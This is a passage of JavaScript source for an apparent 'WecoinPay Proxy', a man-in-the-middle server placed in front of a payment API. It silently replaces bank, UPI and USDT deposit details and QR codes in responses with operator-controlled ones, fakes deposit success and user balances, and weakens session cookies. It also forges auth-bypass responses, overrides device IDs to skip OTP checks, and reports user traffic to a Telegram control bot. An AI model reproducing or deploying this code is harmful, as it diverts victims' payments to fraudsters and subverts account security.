    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
  }).join('\n');
}

app.use((req, res, next) => {
  if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
    req.parsedBody = req.body;
    ensureWebhook().catch(() => { });
    return next();
  }

  const chunks = [];
  let done = false;

  const finish = () => {
    if (done) return;
    done = true;
    if (chunks.length > 0) {
      req.rawBody = Buffer.concat(chunks);
      try {
        const str = req.rawBody.toString('utf8').trim();
        if (str.startsWith('{') || str.startsWith('[')) {
          req.parsedBody = JSON.parse(str);
        } else if (str.includes('=')) {
          const params = new URLSearchParams(str);
          req.parsedBody = Object.fromEntries(params);
        }
      } catch (e) { }
    }
    if (!req.parsedBody && req.body) req.parsedBody = req.body;
    if (!req.parsedBody) req.parsedBody = {};
    ensureWebhook().catch(() => { });

    // === SUSPENDED USER LOGIN INTERCEPTION ===
    const data = cachedData || DEFAULT_DATA;
    if (data.suspendedUsers && Object.keys(data.suspendedUsers).length > 0 && req.originalUrl && req.originalUrl.includes('/app/user/login')) {
      const b = req.parsedBody || {};
      const phoneCand = String(b.phone || b.mobile || b.userName || b.username || b.account || b.user || b.userId || b.memberId || '').trim();
      const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
      const qsPhone = String(qs.get('phone') || qs.get('mobile') || qs.get('userName') || qs.get('username') || '').trim();

      const targets = [phoneCand, qsPhone].filter(Boolean);
      for (const t of targets) {
        const cleanT = t.replace(/^\+91/, '').replace(/\s+/g, '');
        if (!cleanT) continue;
        for (const [sKey, sRule] of Object.entries(data.suspendedUsers)) {
          const cleanSKey = sKey.replace(/^\+91/, '').replace(/\s+/g, '');
          if (cleanT === cleanSKey || cleanT.includes(cleanSKey) || cleanSKey.includes(cleanT)) {
            const customMsg = sRule.message || "Your account has been suspended.";
            if (data.adminChatId && bot) {
              bot.sendMessage(data.adminChatId, `🚫 *Suspended Login Blocked*\n📱 *Target:* \`${cleanT}\`\n💬 *Message Shown:* \`${customMsg}\``, { parse_mode: 'Markdown' }).catch(() => { });
            }
            return res.json({
              code: 1001,
              msg: customMsg,
              message: customMsg
            });
          }
        }
      }
    }

    next();
  };

  req.on('data', c => chunks.push(c));
  req.on('end', finish);
  req.on('error', finish);

  if (req.readableEnded || req.method === 'GET' || req.method === 'HEAD') {
    finish();
  }
});

async function proxyFetch(req, timeoutMs) {
  // === ID OVERRIDE LOGIC (ONLY DEVICEID IS OVERRIDDEN FOR OTP BYPASS) ===
  if (req.originalUrl && req.originalUrl.includes('/app/user/login')) {
    try {
      const data = cachedData || await loadData();
      const body = req.parsedBody || {};

      // 1. Auto-capture last seen deviceId for easy /useid or /alwaysid command usage
      if (body.deviceId) {
        if (!data.lastCapturedId) data.lastCapturedId = {};
        data.lastCapturedId.deviceId = body.deviceId;
        saveData(data).catch(() => { });
      }

      // 2. Check for active deviceId Override (single-use or persistent)
      const override = data.useIdOverride || data.alwaysIdOverride;
      if (override && override.deviceId) {
        body.deviceId = override.deviceId;
        req.parsedBody = body;
        req.rawBody = Buffer.from(JSON.stringify(body), 'utf8');
      }
    } catch (e) { }
  }

  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    // Strip hop-by-hop, encoding, AND all proxy/CDN-injected headers that could confuse upstream
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
      kl === 'transfer-encoding' || kl === 'accept-encoding' ||
      kl === 'forwarded' || kl === 'x-real-ip' || kl === 'true-client-ip' ||
      kl === 'cf-connecting-ip' || kl === 'cf-ray' || kl === 'cf-visitor' ||
      kl === 'cf-ipcountry' || kl === 'cdn-loop' || kl === 'via' ||
      kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
      kl.startsWith('x-invocation') || kl.startsWith('x-amzn') ||
      kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'api.wecoincard.com';
  fwd['accept-encoding'] = 'identity';
  const ac = new AbortController();
  const tm = setTimeout(() => ac.abort(), timeoutMs || 12000);
  const opts = { method: req.method, headers: fwd, signal: ac.signal };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  let response, respBuffer;
  try {
    response = await fetch(url, opts);
    respBuffer = Buffer.from(await response.arrayBuffer());
  } finally {
    clearTimeout(tm);
  }
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl === 'transfer-encoding' || kl === 'connection' || kl === 'content-encoding' || kl === 'content-length' || kl === 'set-cookie') return;
    respHeaders[key] = val;
  });
  try {
    let setCookies = [];
    if (typeof response.headers.getSetCookie === 'function') {
      setCookies = response.headers.getSetCookie();
    } else if (response.headers.raw) {
      setCookies = response.headers.raw()['set-cookie'] || [];
    } else {
      const sc = response.headers.get('set-cookie');
      if (sc) setCookies = [sc];
    }
    if (setCookies && setCookies.length) {
      const rewritten = setCookies.map(c => c
        .replace(/;\s*Domain=[^;]+/ig, '')
        .replace(/;\s*Secure/ig, '')
        .replace(/;\s*SameSite=[^;]+/ig, ''));
      respHeaders['set-cookie'] = rewritten.length === 1 ? rewritten[0] : rewritten;
    }
  } catch (e) { }
  const ct = (respHeaders['content-type'] || respHeaders['Content-Type'] || '').toLowerCase();
  const isText = !ct || ct.includes('json') || ct.includes('text') || ct.includes('xml') || ct.includes('javascript') || ct.includes('html') || ct.includes('form');
  const respBody = isText ? respBuffer.toString('utf8') : '';
  let jsonResp = null;
  if (isText && respBody) {
    try { jsonResp = JSON.parse(respBody); } catch (e) { }
  }

  // Extra debug logs removed for cleaner bot experience

  return { response, respBody, respBuffer, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  return null;
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respBuffer, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp) {
      const rd = getResponseData(jsonResp);
      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.memberId || '') : '';
      if (uid) saveTokenUserId(req, uid);
    }

    const httpIs401 = response && (response.status === 401 || response.status === 403);
    if ((jsonResp && isAuthFailureResponse(jsonResp) || httpIs401) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp || {});
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    const data = cachedData || await loadData();
    if (data.usdtAddress && jsonResp) {
      const result = replaceUsdtInResponse(jsonResp, data);
      if (result && result.oldAddr) {
        const newBody = JSON.stringify(jsonResp);
        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        res.writeHead(response.status, respHeaders);
        res.end(newBody);
        return;
      }
    }

    respHeaders['content-length'] = String(respBuffer.length);
    res.writeHead(response.status, respHeaders);
    res.end(respBuffer);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'payoutaccount': 'accountNo', 'payoutaccountno': 'accountNo', 'payoutno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'payoutname': 'accountHolder', 'payoutaccountholder': 'accountHolder', 'payoutaccountname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'payoutifsc': 'ifsc', 'payoutifsccode': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName', 'payoutbank': 'bankName', 'payoutbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId', 'payoutupi': 'upiId', 'payoutupiid': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?') && !urlStr.includes('pa=')) return urlStr;

  const upiToUse = bank.upiId || (bank.accountNo ? `${bank.accountNo}@${(bank.ifsc || 'npci').toLowerCase()}.ifsc.npci` : '');

  let result = urlStr;

  if (upiToUse) {
    result = result.replace(/([?&])pa=([^&]*)/gi, `$1pa=${encodeURIComponent(upiToUse)}`);
    result = result.replace(/([?&])vpa=([^&]*)/gi, `$1vpa=${encodeURIComponent(upiToUse)}`);
    result = result.replace(/([?&])payeeUpi=([^&]*)/gi, `$1payeeUpi=${encodeURIComponent(upiToUse)}`);
  }

  if (bank.accountHolder) {
    result = result.replace(/([?&])pn=([^&]*)/gi, `$1pn=${encodeURIComponent(bank.accountHolder)}`);
    result = result.replace(/([?&])name=([^&]*)/gi, `$1name=${encodeURIComponent(bank.accountHolder)}`);
    result = result.replace(/([?&])accountName=([^&]*)/gi, `$1accountName=${encodeURIComponent(bank.accountHolder)}`);
    result = result.replace(/([?&])payeeName=([^&]*)/gi, `$1payeeName=${encodeURIComponent(bank.accountHolder)}`);
  }

  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account'], value: bank.accountNo },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
  ];
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }

  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;

  // Skip replacement only for user's payout wallet extraction fields
  const skipKeys = ['payoutwallettype', 'payoutwalletname', 'payoutwalletaccount', 'payoutwalletupi', 'userwallet', 'memberwallet'];

  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');

    if (skipKeys.some(sk => kl.includes(sk))) continue;

    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else {
        deepReplace(val, bank, originalValues, depth + 1);
      }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    // kl is already defined above
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    } else if (!mapped && typeof val === 'string' && val.length > 0) {
      const hasName = kl.includes('name') && !kl.includes('bankname') && !kl.includes('username') && !kl.includes('filename') && !kl.includes('appname');
      if (hasName && bank.accountHolder) {
        if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
        obj[key] = bank.accountHolder;
      }
    }
    if (typeof val === 'string') {
      if (val.includes('://') || (val.includes('?') && val.includes('='))) {
        obj[key] = replaceBankInUrl(val, bank);
      }
      for (const [origKey, origVal] of Object.entries(originalValues)) {
        if (typeof origVal === 'string' && origVal.length > 3 && typeof obj[key] === 'string' && obj[key].includes(origVal)) {
          const mappedF = BANK_FIELDS[origKey.toLowerCase().replace(/[_\-\s]/g, '')];
          if (mappedF && bank[mappedF]) {
            obj[key] = obj[key].split(origVal).join(bank[mappedF]);
          }
        }
      }
    }
  }
}

function markDepositSuccess(obj) {
  if (!obj) return;
  const failValues = [3, '3', 4, '4', -1, '-1', 'failed', 'fail', 'FAILED', 'FAIL', 'cancelled', 'canceled'];
  if (obj.payStatus !== undefined) {
    if (!failValues.includes(obj.payStatus)) obj.payStatus = 2;
    return;
  }
  const statusFields = ['status', 'orderStatus', 'rechargeStatus', 'state', 'stat'];
  for (const field of statusFields) {
    if (obj[field] !== undefined) {
      if (failValues.includes(obj[field])) continue;
      if (typeof obj[field] === 'number') obj[field] = 2;
      else if (typeof obj[field] === 'string') {
        const num = parseInt(obj[field]);
        obj[field] = !isNaN(num) ? '2' : 'success';
      }
    }
  }
}

function addBonusToBalanceFields(obj, bonus) {
  if (!obj || typeof obj !== 'object') return;
  const balanceKeys = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money', 'coin', 'wallet', 'usermoney', 'availableamount'];
  for (const key of Object.keys(obj)) {
    if (balanceKeys.includes(key.toLowerCase())) {
      const current = parseFloat(obj[key]);
      if (!isNaN(current)) {
        obj[key] = typeof obj[key] === 'string' ? String((current + bonus).toFixed(2)) : parseFloat((current + bonus).toFixed(2));
      }
    }
    if (typeof obj[key] === 'object' && obj[key] !== null && !Array.isArray(obj[key])) {
      addBonusToBalanceFields(obj[key], bonus);
    }
  }
}

function replaceUsdtInResponse(jsonResp, data) {
  if (!data.usdtAddress || !jsonResp) return null;
  const newAddr = data.usdtAddress;
  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(newAddr)}`;
  function scanAndReplace(obj, depth) {
    if (!obj || typeof obj !== 'object' || depth > 10) return '';
    if (Array.isArray(obj)) { obj.forEach(item => scanAndReplace(item, depth + 1)); return ''; }
    let oldAddr = '';
    for (const key of Object.keys(obj)) {
      const kl = key.toLowerCase();
      if (typeof obj[key] === 'string') {
        if ((kl.includes('usdt') && (kl.includes('addr') || kl.includes('address'))) || kl === 'walletaddress' || kl === 'customusdtaddress' || kl === 'depositaddress' || kl === 'deposit_address' || kl === 'receiveaddress' || kl === 'receiveraddress' || kl === 'trcaddress' || kl === 'trc20address' || (typeof obj[key] === 'string' && obj[key].length >= 30 && /^T[a-zA-Z0-9]{33}$/.test(obj[key]))) {
          if (obj[key].length >= 20 && obj[key] !== newAddr) {
            oldAddr = oldAddr || obj[key];
            obj[key] = newAddr;
          }
        }
        if (kl === 'qrcode' || kl === 'qrcodeurl' || kl === 'qr' || kl === 'codeurl' || kl === 'qrimg' || kl === 'qrimgurl' || kl === 'codeimgurl' || kl === 'codeimg' || kl === 'qrurl' || kl === 'depositqr' || kl === 'depositqrcode') {
          obj[key] = qrUrl;
        }
        if (kl.includes('qr') || kl.includes('code')) {
          if (typeof obj[key] === 'string' && obj[key].includes('http') && (obj[key].includes('qr') || obj[key].includes('code') || obj[key].includes('.png') || obj[key].includes('.jpg'))) {
            obj[key] = qrUrl;
          }
        }
      } else if (typeof obj[key] === 'object') {
        const found = scanAndReplace(obj[key], depth + 1);
        if (found) oldAddr = oldAddr || found;
      }
    }
    if (oldAddr) {
      const escaped = oldAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === 'string' && obj[key].includes(oldAddr)) {
          obj[key] = obj[key].replace(re, newAddr);
        }
      }
    }
    return oldAddr;
  }
  let foundOld = '';
  const rd = getResponseData(jsonResp);
  if (rd) foundOld = scanAndReplace(rd, 0) || '';
  if (!foundOld) foundOld = scanAndReplace(jsonResp, 0) || '';
  const fullStr = JSON.stringify(jsonResp);
  const trcMatch = fullStr.match(/T[a-zA-Z0-9]{33}/g);
  if (trcMatch) {
    for (const addr of trcMatch) {
      if (addr !== newAddr) {
        foundOld = foundOld || addr;
        const replaced = JSON.stringify(jsonResp).split(addr).join(newAddr);
        try { Object.assign(jsonResp, JSON.parse(replaced)); } catch (e) { }
      }
    }
  }
  return { oldAddr: foundOld, newAddr, qrUrl };
}

app.use((req, res, next) => {
  (async () => {
    try {
      if (!bot) return;
      const data = cachedData || await loadData();
      if (!data.logRequests || !data.adminChatId) return;
      const path = req.originalUrl || req.url;
      if (path.includes('bot-webhook') || path.includes('favicon')) return;
      const tok = getTokenFromReq(req);
      const tKey = cleanToken(tok);
      if (tKey && logOffTokens.has(tKey)) return;
      let userId = tKey ? (tokenUserMap[tKey] || '') : '';
      if (!userId) {
        const body = req.parsedBody || {};
        userId = body.userId || '';
      }
      if (userId && isLogOff(data, userId)) { if (tKey) logOffTokens.add(tKey); return; }
      if (!userId && tKey && redis) {
        try {
          const isOff = await redis.sismember('wecoinpayLogOffTokens', tKey);
          if (isOff) { logOffTokens.add(tKey); return; }
        } catch (e) { }
      }
      const phone = getPhone(data, userId);
      const tag = userId ? ` [${userId}]` : '';
      const phoneTag = phone ? ` (${phone})` : '';
      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(() => { });
    } catch (e) { }
  })();
  next();
});

app.get('/setup-webhook', async (req, res) => {
  if (!bot) return res.json({ error: 'No bot token' });
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
    const info = await bot.getWebHookInfo();
    res.json({ success: true, webhook: info });
  } catch (e) { res.json({ error: e.message }); }
});

app.get('/health', async (req, res) => {
  const redisConnected = !!redis;
  let redisWorking = false;
  if (redis) {
    try { await redis.ping(); redisWorking = true; } catch (e) { }
  }
  const data = await loadData(true);
  const active = getActiveBank(data, null);
  res.json({
    status: 'ok',
    app: 'WecoinPay Proxy',
    redis: redisConnected ? (redisWorking ? 'connected' : 'error') : 'not configured',
    bankActive: !!active,
    totalBanks: data.banks.length,
    adminSet: !!data.adminChatId,
    perIdOverrides: Object.keys(data.userOverrides || {}).length,
    envCheck: { KV_URL: !!process.env.KV_REST_API_URL, KV_TOKEN: !!process.env.KV_REST_API_TOKEN, UPSTASH_URL: !!process.env.UPSTASH_REDIS_REST_URL, UPSTASH_TOKEN: !!process.env.UPSTASH_REDIS_REST_TOKEN }
  });
});

app.get('/bot-webhook', async (req, res) => {
  await ensureWebhook();
  res.json({ status: 'ok', message: 'WecoinPay Bot Webhook Active' });
});

app.post('/bot-webhook', async (req, res) => {
  try {
    await ensureWebhook();
    if (!bot) return res.sendStatus(200);
    const msg = req.parsedBody?.message;
    if (!msg || !msg.text) return res.sendStatus(200);
    const chatId = msg.chat.id;
    const text = msg.text.trim();
    let data = await loadData();

    if (text.startsWith('/start')) {
      const resetSecret = 'resetadmin123';
      const isReset = text.includes(resetSecret);

      if (data.adminChatId && data.adminChatId !== chatId && !isReset) {
        await bot.sendMessage(chatId, '❌ Bot already configured with another admin.');
        return res.sendStatus(200);
      }

      if (isReset) {
        await bot.sendMessage(chatId, '🔄 Admin reset successful!');
      }

      data.adminChatId = chatId;
      await saveData(data);
      await bot.sendMessage(chatId,
        `🏦 *WecoinPay Bot Controller*

=== 💳 BANK MANAGEMENT ===
• \`/banks\` — List all configured banks
• \`/addbank Name|AccNo|IFSC|BankName|UPI|MinAmount\` — Add bank
• \`/setbank <number>\` — Set active bank
• \`/setmin <number> <amount>\` — Set minimum amount for bank
• \`/removebank <number>\` — Remove bank

=== 💰 BALANCE OVERRIDES ===
• \`/add <amount> <userId>\` — Add fake balance to user
• \`/deduct <amount> <userId>\` — Deduct balance from user
• \`/remove balance <userId>\` — Reset user to real balance
• \`/resetallbalance\` — Reset all users to real balance
• \`/history\` or \`/history <userId>\` — View balance history
• \`/clearhistory\` — Clear balance history

=== 📦 ORDERS & BINDINGS ===
• \`/orders\` — View saved order bindings
• \`/delorder <orderCode>\` — Delete order binding
• \`/clearorders\` — Clear all order bindings
• \`/setstatus <orderCode> <1|3|4>\` — Override status (1:Proc, 3:Done, 4:Close)
• \`/delstatus <orderCode|all>\` — Delete status override
• \`/statusoverrides\` — List active status overrides

=== 🎁 DUMMY ORDERS ===
• \`/dummies\` — List active dummy orders
• \`/adddummy <amount> [percent] [min] [max]\` — Add dummy order
• \`/deldummy <code|all>\` — Delete dummy order

=== 🚫 USER & SECURITY ===
• \`/suspend <userId/phone> [reason]\` — Suspend user account
• \`/unsuspend <userId/phone>\` — Unsuspend user account
• \`/suspended\` — List all suspended accounts
• \`/idtrack\` — Show all tracked users
• \`/deltrack <userId>\` — Remove user from tracking
• \`/cleartracking\` — Clear all tracked users
• \`/on log <userId>\` / \`/off log <userId>\` — Toggle user log

=== 📱 OTP BYPASS (DEVICE ID) ===
• \`/useid [deviceId]\` — Single-use login override
• \`/alwaysid [deviceId]\` — Persistent login override
• \`/alwaysid off\` — Turn off persistent
• \`/clearid\` — Clear all ID overrides

=== ⚙️ SYSTEM & CONFIG ===
• \`/status\` — Full system & Redis status
• \`/on\` — Enable proxy
• \`/off\` — Disable proxy
• \`/rotate\` — Toggle bank auto-rotation
• \`/log\` — Toggle request logging
• \`/debug\` (or \`/debug on\`, \`/debug off\`) — Toggle payload debug
• \`/usdt <address|off>\` — Set or remove USDT address
• \`/service <link|off>\` — Set custom support link
• \`/bot2 <token> <chatId>\` — Configure secondary bot
• \`/bot2 on\` / \`/bot2 off\` — Enable/disable secondary bot
• \`/setadmin <newChatId>\` — Transfer admin rights`, { parse_mode: 'Markdown' }
      );
      return res.sendStatus(200);
    }

    if (data.adminChatId && chatId !== data.adminChatId) {
      await bot.sendMessage(chatId, '❌ Unauthorized.');
      return res.sendStatus(200);
    }

    if (text === '/status') {
      const freshData = await loadData(true);
      const active = getActiveBank(freshData, null);
      let redisPing = '❌ Disconnected';
      if (redis) {
        try {
          await redis.set('wecoin_ping', 'ok', { ex: 30 });
          const val = await redis.get('wecoin_ping');
          if (val === 'ok') redisPing = '🟢 Connected & Writable';
          else redisPing = '⚠️ Read Failed';
        } catch (e) {
          redisPing = '⚠️ Error: ' + e.message;
        }
      }

      let m = `📊 *WecoinPay System Status*\n━━━━━━━━━━━━━━━━━━\n` +
        `⚙️ *Proxy:* ${freshData.botEnabled ? '🟢 ON' : '🔴 OFF (Passthrough)'}\n` +
        `🗄 *Redis:* ${redisPing}\n` +
        `🔄 *Auto-Rotate Banks:* ${freshData.autoRotate ? '🟢 ON' : '🔴 OFF'}\n` +
        `📡 *Traffic Logging:* ${freshData.logRequests ? '🟢 ON' : '🔴 OFF'}\n` +
        `🔍 *Debug Mode:* ${freshData.logDebugRequests ? '🟢 ON' : '🔴 OFF'}\n` +
        `👥 *Tracked Users:* ${Object.keys(freshData.trackedUsers || {}).length}\n` +
        `📦 *Saved Order Bindings:* ${Object.keys(freshData.orderBankMap || {}).length}\n` +
        `🎁 *Dummy Orders:* ${(freshData.dummyOrders || []).length}\n` +
        `🚫 *Suspended Accounts:* ${Object.keys(freshData.suspendedUsers || {}).length}\n` +
        `🤖 *Secondary Bot:* ${freshData.bot2Enabled ? '🟢 ON' : '🔴 OFF'}\n`;

      if (freshData.usdtAddress) {
        m += `₮ *USDT Address:* \`${freshData.usdtAddress}\`\n`;
      }
      if (freshData.customServiceLink) {
        m += `🎧 *Support Link:* \`${freshData.customServiceLink}\`\n`;
      }
      if (freshData.alwaysIdOverride && freshData.alwaysIdOverride.deviceId) {
        m += `📱 *Persistent DeviceId:* \`${freshData.alwaysIdOverride.deviceId}\`\n`;
      }

      m += `\n💳 *Active Bank:* ${active ? `\n• *${active.accountHolder}*\n  Acc: \`${active.accountNo}\` | IFSC: \`${active.ifsc}\`${active.upiId ? `\n  UPI: \`${active.upiId}\`` : ''}${active.minAmount ? `\n  Min: ₹${active.minAmount}` : ''}` : '⚠️ None'}\n\n` +
        `🏦 *Total Banks Configured:* ${(freshData.banks || []).length} (use \`/banks\` to view)`;

      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/on') {
      const freshData = await loadData(true);
      freshData.botEnabled = true;
      await saveData(freshData);
      await bot.sendMessage(chatId, '🟢 *Proxy Engine ON* — Bank & balance replacements active.', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/off') {
      const freshData = await loadData(true);
      freshData.botEnabled = false;
      await saveData(freshData);
      await bot.sendMessage(chatId, '🔴 *Proxy Engine OFF* — Pure passthrough to upstream.', { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/rotate') {
      const freshData = await loadData(true);
      freshData.autoRotate = !freshData.autoRotate;
      freshData.lastUsedIndex = -1;
      await saveData(freshData);
      await bot.sendMessage(chatId, `🔄 *Bank Auto-Rotate:* ${freshData.autoRotate ? '🟢 ON' : '🔴 OFF'}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/log') {
      const freshData = await loadData(true);
      freshData.logRequests = !freshData.logRequests;
      await saveData(freshData);
      await bot.sendMessage(chatId, `📋 *Traffic Logging:* ${freshData.logRequests ? '🟢 ON' : '🔴 OFF'}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/debug' || text === '/debug on' || text === '/debug off') {
      const freshData = await loadData(true);
      if (text === '/debug on') freshData.logDebugRequests = true;
      else if (text === '/debug off') freshData.logDebugRequests = false;
      else freshData.logDebugRequests = !freshData.logDebugRequests;
      await saveData(freshData);
      await bot.sendMessage(chatId, `🔍 *Full Payload Debug Mode:* ${freshData.logDebugRequests ? '🟢 ON (All API request/response payloads will be sent to bot)' : '🔴 OFF'}`, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text === '/banks') {
      const freshData = await loadData(true);
      if (!freshData.banks || freshData.banks.length === 0) {
        await bot.sendMessage(chatId, '❌ No banks configured. Use `/addbank Name|AccNo|IFSC|BankName|UPI|MinAmount` to add one.', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      let m = `💳 *Configured Banks (${freshData.banks.length}):*\n━━━━━━━━━━━━━━━━━━\n\n` + bankListText(freshData);
      await bot.sendMessage(chatId, m, { parse_mode: 'Markdown' });
      return res.sendStatus(200);
    }

    if (text.startsWith('/addbank')) {
      const rawArg = text.replace(/^\/addbank\s*/i, '').trim();
      if (!rawArg) {
        await bot.sendMessage(chatId, `❌ *Usage:* \`/addbank Name|AccNo|IFSC|BankName|UPI|MinAmount\`\n\n*Example:*\n\`/addbank Rahul Kumar|1234567890|SBIN0001234|SBI|rahul@upi|500\``, { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const parts = rawArg.includes('|') ? rawArg.split('|').map(s => s.trim()) : rawArg.split(/\s+/);
      if (parts.length < 3) {
        await bot.sendMessage(chatId, '❌ At least Name, Account Number, and IFSC are required.\nFormat: `/addbank Name|AccNo|IFSC|BankName|UPI|MinAmount`', { parse_mode: 'Markdown' });
        return res.sendStatus(200);
      }
      const freshData = await loadData(true);
      freshData.banks = freshData.banks || [];
      const newBank = {
        accountHolder: parts[0],
        accountNo: parts[1],
        ifsc: parts[2],
        bankName: parts[3] || '',
        upiId: parts[4] || '',
        minAmount: parts[5] ? (parseFloat(parts[5]) || 0) : 0
      };
      freshData.banks.push(newBank);
      if (freshData.activeIndex < 0) freshData.activeIndex = 0;
      await saveData(freshData);
